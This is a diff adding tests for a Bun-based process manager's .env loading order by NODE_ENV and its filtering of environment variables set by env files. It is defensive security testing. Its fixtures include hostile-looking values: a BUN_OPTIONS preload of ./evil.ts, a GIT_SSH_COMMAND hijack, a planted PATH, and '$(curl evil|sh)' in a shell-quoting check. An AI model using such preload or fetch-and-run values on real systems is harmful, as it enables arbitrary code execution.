@@ -8,7 +8,10 @@ import {
   buildSpawnEnv,
   buildSpawnPlan,
   cliTwin,
+  dotenvAssignedNames,
   entryFileFor,
+  envFilenamesFor,
+  envModeOf,
   findHarnessRoot,
   findSpecPath,
   isInside,
@@ -269,6 +272,219 @@ describe("the env chain", () => {
   });
 });
 
+describe("the env chain reads the files Bun reads, by NODE_ENV", () => {
+  /** One file per name, each setting its own marker and a shared `WHO`. */
+  function everyModeFile(): string {
+    const dir = tempHarness();
+    const names = [
+      ".env",
+      ".env.local",
+      ".env.development",
+      ".env.development.local",
+      ".env.production",
+      ".env.production.local",
+      ".env.test",
+      ".env.test.local",
+      ".env.staging",
+    ];
+    for (const name of names)
+      writeFileSync(join(dir, name), `WHO=${name}\nHAS${name.replaceAll(".", "_")}=1\n`);
+    return dir;
+  }
+
+  test("each mode's files, lowest precedence first", () => {
+    expect(envFilenamesFor("development")).toEqual([
+      ".env",
+      ".env.development",
+      ".env.local",
+      ".env.development.local",
+    ]);
+    expect(envFilenamesFor("production")).toEqual([
+      ".env",
+      ".env.production",
+      ".env.local",
+      ".env.production.local",
+    ]);
+    expect(envFilenamesFor("test")).toEqual([".env", ".env.test", ".env.test.local"]);
+    expect(envModeOf(undefined)).toBe("development");
+    expect(envModeOf("staging")).toBe("development");
+    expect(envModeOf("production")).toBe("production");
+    expect(envModeOf("test")).toBe("test");
+  });
+
+  test("unset: the development files, .env.development.local last", () => {
+    const chain = loadEnvChain(everyModeFile(), { sharedFiles: [] });
+    expect(chain.files).toEqual([
+      ".env",
+      ".env.development",
+      ".env.local",
+      ".env.development.local",
+    ]);
+    expect(chain.vars["WHO"]).toBe(".env.development.local");
+  });
+
+  test("production: the production files", () => {
+    const chain = loadEnvChain(everyModeFile(), { sharedFiles: [], nodeEnv: "production" });
+    expect(chain.files).toEqual([".env", ".env.production", ".env.local", ".env.production.local"]);
+    expect(chain.vars["WHO"]).toBe(".env.production.local");
+  });
+
+  test("test: no .env.local, and .env.test.local last", () => {
+    const chain = loadEnvChain(everyModeFile(), { sharedFiles: [], nodeEnv: "test" });
+    expect(chain.files).toEqual([".env", ".env.test", ".env.test.local"]);
+    expect(chain.vars["HAS_env_local"]).toBeUndefined();
+    expect(chain.vars["WHO"]).toBe(".env.test.local");
+  });
+
+  test("any other NODE_ENV reads the development files", () => {
+    const chain = loadEnvChain(everyModeFile(), { sharedFiles: [], nodeEnv: "staging" });
+    expect(chain.files).toEqual([
+      ".env",
+      ".env.development",
+      ".env.local",
+      ".env.development.local",
+    ]);
+    expect(chain.vars["HAS_env_staging"]).toBeUndefined();
+  });
+
+  test("with no NODE_ENV from the manager, the one .env sets decides; the manager's wins", () => {
+    const dir = tempHarness({ env: "NODE_ENV=production\nA=env\n" });
+    writeFileSync(join(dir, ".env.production"), "A=production\n");
+    writeFileSync(join(dir, ".env.development"), "A=development\n");
+    const fromFile = loadEnvChain(dir, { sharedFiles: [] });
+    expect(fromFile.files).toEqual([".env", ".env.production"]);
+    expect(fromFile.vars["A"]).toBe("production");
+    const manager = loadEnvChain(dir, { sharedFiles: [], nodeEnv: "development" });
+    expect(manager.files).toEqual([".env", ".env.development"]);
+    // The spawn env passes the manager's NODE_ENV to the chain.
+    const spawn = buildSpawnEnv({ harnessRoot: dir, processEnv: { NODE_ENV: "test" } });
+    expect(spawn.envFiles).toEqual([".env"]);
+    expect(spawn.env["A"]).toBe("env");
+    expect(spawn.env["NODE_ENV"]).toBe("test");
+  });
+
+  test("a harness with only .env reads only .env", () => {
+    const dir = tempHarness({ env: "A=1\n" });
+    expect(loadEnvChain(dir, { sharedFiles: [] })).toMatchObject({
+      vars: { A: "1" },
+      files: [".env"],
+    });
+  });
+
+  test("the compiled daemon runs with Bun's env-file loading off", () => {
+    const dir = tempHarness({ bundle: "daemon.ts" });
+    const plan = buildSpawnPlan({ harnessDir: dir, target: "channel", processEnv: {} });
+    expect(plan.argv[1]).toBe("--no-env-file");
+    expect(plan.argv).toEqual(["bun", "--no-env-file", join(dir, "dist", "daemon.ts")]);
+  });
+
+  // A real daemon and a real stdio child: the child gets the MCP SDK's default inherited
+  // names from the daemon's environment, which is the manager's filtered chain and nothing
+  // the daemon loaded itself.
+  test.skipIf(process.platform === "win32")(
+    "a stdio child of the daemon never sees a PATH a member's .env sets",
+    () => {
+      const dir = tempHarness();
+      const planted = join(dir, "bin");
+      writeFileSync(join(dir, ".env"), `PATH=${planted}\nGREETING=hi\n`);
+      writeFileSync(join(dir, ".env.development"), "MODE_FILE=1\n");
+      mkdirSync(join(dir, "dist"), { recursive: true });
+      // The SDK's DEFAULT_INHERITED_ENV_VARS on POSIX, copied: this fixture resolves no
+      // workspace package. The stdio child reads no env file of its own.
+      writeFileSync(
+        join(dir, "dist", "daemon.ts"),
+        [
+          'const names = ["HOME", "LOGNAME", "PATH", "SHELL", "TERM", "USER"];',
+          "const env: Record<string, string> = {};",
+          "for (const name of names) {",
+          "  const value = process.env[name];",
+          '  if (value !== undefined && !value.startsWith("()")) env[name] = value;',
+          "}",
+          "const child = Bun.spawnSync(",
+          '  [process.execPath, "--no-env-file", "-e", "console.log(process.env.PATH ?? String())"],',
+          "  { env, cwd: process.cwd() },",
+          ");",
+          "console.log(JSON.stringify({",
+          "  greeting: process.env.GREETING ?? null,",
+          "  mode: process.env.MODE_FILE ?? null,",
+          "  childPath: child.stdout.toString().trim(),",
+          "}));",
+        ].join("\n"),
+      );
+      const plan = buildSpawnPlan({
+        harnessDir: dir,
+        target: "channel",
+        processEnv: {},
+        bunBin: process.execPath,
+      });
+      expect(plan.env["PATH"]).toBeUndefined();
+      const run = Bun.spawnSync([...plan.argv], { cwd: plan.cwd, env: plan.env });
+      const out = JSON.parse(run.stdout.toString().trim().split("\n").at(-1) ?? "{}") as {
+        greeting?: string;
+        mode?: string;
+        childPath?: string;
+      };
+      expect(out.greeting).toBe("hi");
+      expect(out.mode).toBe("1");
+      expect(out.childPath).toBeDefined();
+      expect(out.childPath).not.toContain(planted);
+    },
+    20_000, // two real Bun processes
+  );
+});
+
+describe("a loader setting an env file names never reaches the child, whatever its value", () => {
+  // `processEnv` here is what Bun's own loader put in a manager started in the harness.
+  test("a value Bun expanded as it loaded it is still left out", () => {
+    const dir = tempHarness({ env: "BUN_OPTIONS=--preload ./evil${NOPE}.ts\n" });
+    const spawn = buildSpawnEnv({
+      harnessRoot: dir,
+      managerCwd: dir,
+      processEnv: { PATH: "/usr/bin", BUN_OPTIONS: "--preload ./evil.ts" },
+    });
+    expect(spawn.env["BUN_OPTIONS"]).toBeUndefined();
+    expect(spawn.dropped).toContain("BUN_OPTIONS");
+    expect(spawn.env["PATH"]).toBe("/usr/bin");
+  });
+
+  test("a file of another mode than the chain reads is checked too", () => {
+    const dir = tempHarness({ env: "NODE_ENV=production\n" });
+    writeFileSync(join(dir, ".env.development"), "BUN_OPTIONS=--preload ./evil.ts\n");
+    const spawn = buildSpawnEnv({
+      harnessRoot: dir,
+      managerCwd: dir,
+      processEnv: { PATH: "/usr/bin", NODE_ENV: "production", BUN_OPTIONS: "--preload ./evil.ts" },
+    });
+    expect(spawn.envFiles).not.toContain(".env.development");
+    expect(spawn.env["BUN_OPTIONS"]).toBeUndefined();
+    expect(spawn.dropped).toContain("BUN_OPTIONS");
+  });
+
+  test("the env files of the directory the manager started in are checked", () => {
+    const dir = tempHarness();
+    const managerCwd = mkdtempSync(join(tmpdir(), "chsup-manager-"));
+    roots.push(managerCwd);
+    writeFileSync(join(managerCwd, ".env.local"), "  export GIT_SSH_COMMAND : ./ssh.sh\r\n");
+    const spawn = buildSpawnEnv({
+      harnessRoot: dir,
+      managerCwd,
+      processEnv: { GIT_SSH_COMMAND: "./ssh.sh", LD_PRELOAD: "/opt/lib.so" },
+    });
+    expect(spawn.env["GIT_SSH_COMMAND"]).toBeUndefined();
+    // A loader setting no env file names is the operator's own, and passes.
+    expect(spawn.env["LD_PRELOAD"]).toBe("/opt/lib.so");
+    expect(spawn.dropped).toEqual(["GIT_SSH_COMMAND"]);
+  });
+
+  test("every spelling of an assignment Bun takes is a name", () => {
+    expect([
+      ...dotenvAssignedNames(
+        "A=1\n  B = 2\nexport C=3\nexport\tD:4\r\nE : 5\n# F=6\nG\nLD_PRELOAD=x",
+      ),
+    ]).toEqual(["A", "B", "C", "D", "E", "LD_PRELOAD"]);
+  });
+});
+
 describe("shared fleet env files (manager.envFiles)", () => {
   /** A harness inside a fleet dir that holds the shared `.env`. */
   function fleetHarness(options: {
@@ -407,7 +623,7 @@ describe("buildSpawnPlan", () => {
     const plan = buildSpawnPlan({ harnessDir: dir, target: "cli", processEnv: {} });
     expect(plan.launchMode).toBe("compiled");
     expect(plan.canResume).toBe(false);
-    expect(plan.argv).toEqual(["bun", join(dir, "dist", "agent.ts")]);
+    expect(plan.argv).toEqual(["bun", "--no-env-file", join(dir, "dist", "agent.ts")]);
     expect(plan.stdio).toBe("pipe");
   });
 
@@ -428,7 +644,7 @@ describe("buildSpawnPlan", () => {
     expect(plan.supervised).toBe(true);
     // cwd is the harness ROOT, never the bundle dir.
     expect(plan.cwd).toBe(dir);
-    expect(plan.argv).toEqual(["bun", join(dir, "dist", "daemon.ts")]);
+    expect(plan.argv).toEqual(["bun", "--no-env-file", join(dir, "dist", "daemon.ts")]);
     expect(plan.env["PORT"]).toBe("3000");
     expect(plan.env["CREWHAUS_CONTROL_PORT"]).toBe("3001");
     expect(plan.env["CREWHAUS_CONTROL_TOKEN"]).toBe("token-value");
@@ -443,7 +659,7 @@ describe("buildSpawnPlan", () => {
     expect(plan.runClass).toBe("worker");
     expect(plan.kind).toBe("daemon");
     expect(plan.supervised).toBe(true);
-    expect(plan.argv[1]).toBe(join(dir, "dist", "agent.ts"));
+    expect(plan.argv[2]).toBe(join(dir, "dist", "agent.ts"));
   });
 
   test("a one-shot job is detached, ledgered as a job, and never supervised", () => {
@@ -594,7 +810,7 @@ describe("runOptionFlags + cliTwin", () => {
     // Every metacharacter survives as TEXT inside single quotes…
     expect(twin).toContain("$(curl evil|sh)");
     // …and the only unquoted shell syntax is the `cd … && …` scaffold.
-    expect(twin.replace(/'[^']*'/g, "«»")).toBe("cd «» && «» «»");
+    expect(twin.replace(/'[^']*'/g, "«»")).toBe("cd «» && «» «» «»");
   });
 });
 
